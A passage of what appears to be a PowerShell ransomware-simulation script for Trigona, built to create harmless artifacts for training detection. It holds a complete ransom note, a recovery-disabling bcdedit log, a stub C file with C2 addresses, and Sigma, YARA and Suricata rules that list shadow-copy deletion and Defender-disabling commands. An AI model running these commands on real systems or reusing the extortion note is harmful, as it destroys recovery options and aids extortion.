                      ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", 
                      ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", 
                      ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", 
                      ".jpeg", ".iso", ".7z", ".gz", ".tgz", ".rar", ".zip", ".backup", ".iso", ".pfx", 
                      ".p12", ".p7b", ".p7c", ".dat", ".csv", ".xml", ".txt", ".pdf", ".xls", ".xlsx", 
                      ".xlsm", ".xlsb", ".doc", ".docx", ".docm", ".odt")
    
    # Create simulated encrypted files
    $victimFiles = @(
        @{ Name = "Important_Document.docx"; Content = "This is an important document content" },
        @{ Name = "Financial_Report.xlsx"; Content = "Financial data and projections" },
        @{ Name = "Business_Plan.pdf"; Content = "Strategic business plan details" },
        @{ Name = "Customer_Database.csv"; Content = "Customer information and contact details" },
        @{ Name = "Source_Code.java"; Content = "Proprietary source code" }
    )
    
    foreach ($file in $victimFiles) {
        $filePath = "$($SimPaths.VictimFiles)\$($file.Name)"
        Set-Content -Path $filePath -Value $file.Content -Force
        
        # Create a simulated "encrypted" version
        $encryptedContent = "TRIGONA RANSOMWARE ENCRYPTED FILE`n"
        $encryptedContent += "Original filename: $($file.Name)`n"
        $encryptedContent += "Encryption timestamp: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")`n"
        $encryptedContent += "This file has been encrypted with a strong algorithm and cannot be recovered without the decryption key."
        
        $encryptedPath = "$filePath.trigona"
        Set-Content -Path $encryptedPath -Value $encryptedContent -Force
    }
    
    # STEP 4: Create ransom notes
    $ransomNote = @"
████████╗██████╗ ██╗ ██████╗  ██████╗ ███╗   ██╗ █████╗ 
╚══██╔══╝██╔══██╗██║██╔════╝ ██╔═══██╗████╗  ██║██╔══██╗
   ██║   ██████╔╝██║██║  ███╗██║   ██║██╔██╗ ██║███████║
   ██║   ██╔══██╗██║██║   ██║██║   ██║██║╚██╗██║██╔══██║
   ██║   ██║  ██║██║╚██████╔╝╚██████╔╝██║ ╚████║██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝

YOUR NETWORK HAS BEEN INFECTED WITH TRIGONA RANSOMWARE!

All your files have been encrypted with a strong algorithm.
To decrypt your files, you need to purchase the decryption key.

WHAT HAPPENED?
Your important files have been encrypted. Many of your documents, photos, videos, 
databases and other files are no longer accessible because they have been encrypted.
Maybe you are looking for a way to recover your files, but don't waste your time.

HOW TO RECOVER?
To decrypt your files, you need to pay the ransom and get the decryption tool.
Follow these steps:

1. Download and install Tor Browser from: https://www.torproject.org/
2. Open our website in Tor Browser: http://ransom.trigona.xyz
3. Enter your personal ID: TRIGONA-XDA5-NN72-8ASX
4. Follow the instructions to pay the ransom and receive the decryption key

WARNING:
DO NOT attempt to decrypt your files with third-party software as this may damage them!
DO NOT modify or rename the encrypted files or you may lose them forever!
DO NOT contact law enforcement or security companies or we will destroy your data!

Your personal ID: TRIGONA-XDA5-NN72-8ASX
"@
    
    # Create ransom notes in multiple locations
    $ransomNoteLocations = @(
        "$($SimPaths.Root)\Readme-Recover-Files-Trigona.txt",
        "$env:USERPROFILE\Desktop\Readme-Recover-Files-Trigona.txt",
        "$($SimPaths.VictimFiles)\Readme-Recover-Files-Trigona.txt"
    )
    
    foreach ($notePath in $ransomNoteLocations) {
        Set-Content -Path $notePath -Value $ransomNote -Force
    }
    
    # STEP 5: Create registry keys for ransomware
    New-Item -Path "HKCU:\Software\Trigona" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Trigona" -Name "ID" -Value "TRIGONA-XDA5-NN72-8ASX" -PropertyType String -Force | Out-Null
    
    # STEP 6: Simulate wallpaper change
    $wallpaperPath = "$($SimPaths.Payloads)\trigona_wallpaper.jpg"
    $wallpaperBytes = New-Object byte[] 8192
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($wallpaperBytes)
    [System.IO.File]::WriteAllBytes($wallpaperPath, $wallpaperBytes)
    
    # Create registry key to track wallpaper change attempt
    New-Item -Path "HKCU:\Software\Trigona\Wallpaper" -Force | Out-Null
    New-ItemProperty -Path "HKCU:\Software\Trigona\Wallpaper" -Name "WallpaperPath" -Value $wallpaperPath -PropertyType String -Force | Out-Null
    
    # STEP 7: Create bootloader modification simulation
    $bootloaderSimContent = @"
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
"@
    
    $bootloaderSimPath = "$($SimPaths.Logs)\bootloader_modification.log"
    Set-Content -Path $bootloaderSimPath -Value $bootloaderSimContent -Force
    
    # STEP 8: Create YARA-triggering file content
    $yaraMatchContent = @"
// Simulated Trigona binary content for YARA rule matching
// DO NOT EXECUTE - FOR FORENSIC ANALYSIS TRAINING ONLY

// Common Trigona strings
const char* trigona_strings[] = {
    "YOUR NETWORK HAS BEEN INFECTED WITH TRIGONA RANSOMWARE!",
    "All your files have been encrypted with a strong algorithm.",
    "To decrypt your files, you need to purchase the decryption key.",
    "http://ransom.trigona.xyz",
    "TRIGONA-XDA5-NN72-8ASX",
    ".trigona"
};

// PE metadata for YARA matching
char PE_metadata[] = "Trigona Ransomware v4.2.1";

// Simulated encryption function signatures
void encrypt_files(char* path) {
    // AES-256 encryption simulation
    char key[] = "fd8c87e9a5642b3a7c83aefde8d53a84c3aaa2e97b2a3a41d54a5b7c95239e24";
    char iv[] = "9a8f7e6d5c4b3a21";
    
    // File extensions targeted
    char* extensions[] = {".docx", ".xlsx", ".pdf", ".jpg", ".png"};
    
    // File encryption logic
    // ...
}

// Command and control URL patterns
const char* c2_patterns[] = {
    "http://23.146.242.199/",
    "http://130.0.232.213/",
    "http://ransom.trigona.xyz"
};

// Registry modifications
void modify_registry() {
    // Disable Windows Defender
    // Disable recovery options
    // ...
}

// Anti-VM checks
bool detect_vm() {
    // Check for VM artifacts
    // ...
    return false;
}

// Main function
int main() {
    // Initial checks
    if(detect_vm()) return 0;
    
    // Kill processes and services
    kill_processes();
    disable_services();
    
    // Delete shadow copies
    delete_shadow_copies();
    
    // Start encryption
    encrypt_files("C:\\");
    
    // Create ransom notes
    create_ransom_notes();
    
    // Change wallpaper
    set_wallpaper();
    
    // Contact C2 server
    send_encryption_report();
    
    return 0;
}
"@
    
    $yaraMatchPath = "$($SimPaths.Payloads)\trigona_yara_match.c"
    Set-Content -Path $yaraMatchPath -Value $yaraMatchContent -Force
    
    # STEP 9: Create sample YARA rule
    $yaraRuleContent = @"
rule Trigona_Ransomware {
    meta:
        description = "Detects Trigona Ransomware"
        author = "TrigonaSim"
        reference = "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/"
        date = "2023-12-24"
        hash = "aef9c9370d1bdbc123acfe665696d2a0e034e95dce56d09b932cd37df73fe0ef"
    
    strings:
        $s1 = "YOUR NETWORK HAS BEEN INFECTED WITH TRIGONA RANSOMWARE!" ascii wide
        $s2 = "All your files have been encrypted with a strong algorithm" ascii wide
        $s3 = "http://ransom.trigona.xyz" ascii wide
        $s4 = "TRIGONA-" ascii wide
        $s5 = ".trigona" ascii wide
        
        $code1 = { 83 EC 44 53 56 8B F1 8B DA 8B CE 57 }
        $code2 = { 68 ?? ?? ?? ?? FF 15 ?? ?? ?? ?? 85 C0 89 45 FC }
        $code3 = { 6A 00 6A 00 6A 03 6A 00 6A 03 68 00 00 00 C0 }
        
        $mutex = "Global\\Trigona" ascii wide
        
        $ext1 = ".vhd" ascii wide nocase
        $ext2 = ".sql" ascii wide nocase
        $ext3 = ".xlsx" ascii wide nocase
        $ext4 = ".docx" ascii wide nocase
        $ext5 = ".pdf" ascii wide nocase
    
    condition:
        uint16(0) == 0x5A4D and
        (
            (3 of ($s*)) or
            (2 of ($code*) and 2 of ($s*)) or
            (1 of ($mutex) and 2 of ($s*)) or
            (3 of ($ext*) and 2 of ($s*))
        )
}

rule Trigona_Ransom_Note {
    meta:
        description = "Detects Trigona Ransomware Ransom Note"
        author = "TrigonaSim"
        reference = "https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/"
        date = "2023-12-24"
    
    strings:
        $header = "YOUR NETWORK HAS BEEN INFECTED WITH TRIGONA RANSOMWARE" ascii wide
        $recover1 = "To decrypt your files, you need to purchase the decryption key" ascii wide
        $recover2 = "Download and install Tor Browser" ascii wide
        $recover3 = "Open our website in Tor Browser: http://ransom.trigona.xyz" ascii wide
        $id = "Your personal ID:" ascii wide
        $warning1 = "DO NOT attempt to decrypt your files with third-party software" ascii wide
        $warning2 = "DO NOT modify or rename the encrypted files" ascii wide
        
    condition:
        $header and 3 of them
}
"@
    
    $yaraRulePath = "$($SimPaths.Tools)\trigona.yar"
    Set-Content -Path $yaraRulePath -Value $yaraRuleContent -Force
    
    # STEP 10: Create SIGMA rule
    $sigmaRuleContent = @"
title: Trigona Ransomware Detection
id: 5f9b7a8c-3d2e-4f8d-a9b1-c8e7f6d2e3b4
status: experimental
description: Detects Trigona ransomware execution patterns
references:
    - https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/
author: TrigonaSim
date: 2023/12/24
tags:
    - attack.execution
    - attack.impact
    - attack.t1486 # Data Encrypted for Impact
logsource:
    category: process_creation
    product: windows
detection:
    selection_commands:
        CommandLine|contains:
            - 'vssadmin delete shadows /all'
            - 'wmic shadowcopy delete'
            - 'bcdedit /set {default} recoveryenabled No'
            - 'bcdedit /set {default} bootstatuspolicy ignoreallfailures'
    
    selection_extensions:
        CommandLine|contains:
            - '.trigona'
            - 'Readme-Recover-Files-Trigona.txt'
    
    selection_registry:
        CommandLine|contains:
            - 'reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f'
            - 'reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware /t REG_DWORD /d 1 /f'
    
    selection_processes:
        CommandLine|contains:
            - 'taskkill /f /im sql'
            - 'taskkill /f /im oracle'
            - 'taskkill /f /im ocssd'
            - 'taskkill /f /im dbsnmp'
    
    condition: 1 of selection_*

falsepositives:
    - System administration activities
    - Legitimate software that modifies system recovery settings
level: high
"@
    
    $sigmaRulePath = "$($SimPaths.Tools)\trigona.yml"
    Set-Content -Path $sigmaRulePath -Value $sigmaRuleContent -Force
    
    # STEP 11: Create Suricata rules
    $suricataRuleContent = @"
# Trigona Ransomware Suricata Rules
# Based on: https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/

# Trigona C2 Communication
alert http \$HOME_NET any -> \$EXTERNAL_NET any (msg:"MALWARE-CNC Trigona Ransomware C2 Communication"; flow:established,to_server; content:"User-Agent: TBrowser"; http_header; content:"/upload.php"; http_uri; reference:url,thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/; classtype:trojan-activity; sid:10000001; rev:1;)

# Trigona Initial Access
alert http \$HOME_NET any -> \$EXTERNAL_NET any (msg:"MALWARE-CNC Trigona Initial Access - IcedID"; flow:established,to_server; content:"POST"; http_method; content:"/load"; http_uri; content:"application/octet-stream"; http_header; reference:url,thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/; classtype:trojan-activity; sid:10000002; rev:1;)

# Trigona C2 IP Communication
alert ip \$HOME_NET any -> [23.146.242.199,130.0.232.213] any (msg:"MALWARE-CNC Trigona Ransomware C2 IP Communication"; reference:url,thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/; classtype:trojan-activity; sid:10000003; rev:1;)

# Trigona Ransomware DNS Request
alert dns \$HOME_NET any -> any any (msg:"MALWARE-CNC Trigona Ransomware DNS Query"; dns.query; content:"ransom.trigona.xyz"; nocase; reference:url,thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/; classtype:trojan-activity; sid:10000004; rev:1;)

# Trigona Data Exfiltration
alert http \$HOME_NET any -> \$EXTERNAL_NET any (msg:"MALWARE-CNC Trigona Data Exfiltration"; flow:established,to_server; content:"POST"; http_method; http_content_len:>500000; content:"multipart/form-data"; http_header; reference:url,thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/; classtype:trojan-activity; sid:10000005; rev:1;)
"@
    
    $suricataRulePath = "$($SimPaths.Tools)\trigona.rules"
    Set-Content -Path $suricataRulePath -Value $suricataRuleContent -Force
    
    # Log ransomware activities
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1349 -Message "SIMULATION: Trigona ransomware attempting to terminate processes" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1350 -Message "SIMULATION: Trigona ransomware attempting to disable services and delete shadow copies" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1351 -Message "SIMULATION: Trigona ransomware encryption phase completed" -EntryType Warning
    Write-EventLog -LogName "Application" -Source "TrigonaSim" -EventId 1352 -Message "SIMULATION: Trigona ransomware attempting to change desktop wallpaper" -EntryType Warning
    
    Write-Host "  [+] Trigona Ransomware Impact artifacts created" -ForegroundColor Yellow
}

# ============================================================================
# MAIN EXECUTION FUNCTION
# ============================================================================

function Start-TrigonaSimulation {
    # Initial confirmation and setup
    Confirm-Execution
    $logPath = Start-SimulationLogging
    $simPaths = Initialize-SimulationEnvironment
    
    Write-Host "`n[+] Starting Trigona Ransomware simulation..." -ForegroundColor Cyan
    Write-Host "    Full attack chain based on: https://thedfirreport.com/2024/01/29/buzzing-on-christmas-eve-trigona-ransomware-in-3-hours/`n" -ForegroundColor Cyan
    
    # Phase 1: Initial Access
    $icedidPath = Simulate-InitialAccess -SimPaths $simPaths
    
    # Phase 2: Execution & Privilege Escalation
    Simulate-ExecutionAndPrivEsc -SimPaths $simPaths -IcedidPath $icedidPath
    
    # Phase 3: Defense Evasion
    Simulate-DefenseEvasion -SimPaths $simPaths

    # Phase 4: Credential Access & Discovery
    Simulate-CredentialAccessAndDiscovery -SimPaths $simPaths
    
    # Phase 5: Lateral Movement
    Simulate-LateralMovement -SimPaths $simPaths
    
    # Phase 6: Collection & Exfiltration
    Simulate-CollectionAndExfiltration -SimPaths $simPaths
    
    # Phase 7: Impact - Trigona Ransomware
    Simulate-TrigonaRansomware -SimPaths $simPaths
    
    # Simulation Complete
    Write-Host "`n[+] Trigona Ransomware attack simulation completed successfully!" -ForegroundColor Green
    Write-Host "    All artifacts have been created in $($simPaths.Root)" -ForegroundColor Green
    Write-Host "    Logs available at: $logPath" -ForegroundColor Green
    Write-Host "`nIMPORTANT: This is a simulation only. No actual malicious activities were performed." -ForegroundColor Yellow
    Write-Host "           The artifacts created will trigger security tools and EDR solutions." -ForegroundColor Yellow
    
    # Stop logging
    Stop-Transcript
    
    return $simPaths
}

# Execute the main simulation function
# This will start the entire Trigona ransomware attack chain simulation
Start-TrigonaSimulation